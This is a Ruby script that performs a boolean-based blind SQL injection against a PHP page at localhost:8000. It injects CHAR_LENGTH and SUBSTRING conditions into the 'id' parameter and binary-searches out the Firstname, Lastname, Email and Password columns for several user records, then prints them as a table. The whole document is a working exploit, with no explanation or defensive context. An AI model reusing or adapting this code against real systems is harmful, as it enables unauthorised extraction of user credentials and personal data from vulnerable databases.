require 'open-uri'
require 'pp'

END {    
    FIELDS_TO_SEEK = ["Firstname", "Lastname", "Email", "Password"]
    data = (1..3).map do |index|        
        total_request = 0
        
        puts '-'*100  
        puts "id: #{index}"
        FIELDS_TO_SEEK.map do |field|
            password_length = guess_value{ |value|
                total_request += 1
                URI.open("http://localhost:8000/active.php?id=#{index} and CHAR_LENGTH(#{field}) > #{value}").read.include?  "account"
            }
            
            field_data = find_data(field, password_length){ |n,byte|
                total_request += 1
                URI.open("http://localhost:8000/active.php?id=#{index} and SUBSTRING(#{field},#{n},1) collate utf8_bin >  CHAR(#{byte} USING UCS2)").read.include?  "account"
            }
            
            field_data + " (#{total_request})"
        end
    end  
    display_table data, FIELDS_TO_SEEK
}

#thank you nicolas maitre
def display_table lines, headers
    lines.unshift headers if headers
    #col widths
    col_widths = lines.first.each_with_index.map do |_, col_ind|
        lines.reduce(0){|acc, line| ((line[col_ind].length > acc) ? line[col_ind].length : acc)} + 1
    end
    width = col_widths.reduce(1){|acc, col_length| acc + col_length + 2}
    #display
    lines.each do |line|
        puts '-'*width
        line.each_with_index do |content, ind|
            print '|'
            print ' ' + "%-#{col_widths[ind]}.#{col_widths[ind]}s" % content
        end
        puts '|'
    end
    puts '-'*width
end

def guess_value start_value = 1
    max_value = start_value
    max_value *= 2 while yield max_value
    min_value = max_value / 2
    
    loop do
        value = (max_value - min_value) / 2 + min_value
        is_biggest = yield value
        is_biggest ? min_value = value : max_value = value
          
        return max_value  if (max_value - min_value) <= 1
    end
end

def find_data field, data_length
    data=""
    data_length.times do |n|
        data += guess_value(32) { |byte| 
            print "\t\r#{field}: #{data}#{byte.chr(Encoding::UTF_8).sub(/[^[:print:]]/,"")}"
            yield n+1,byte
        }.chr(Encoding::UTF_8) 
        print "\t\r#{field}: #{data.sub(/[^[:print:]]/,"")}"
    end
    puts
    return data
end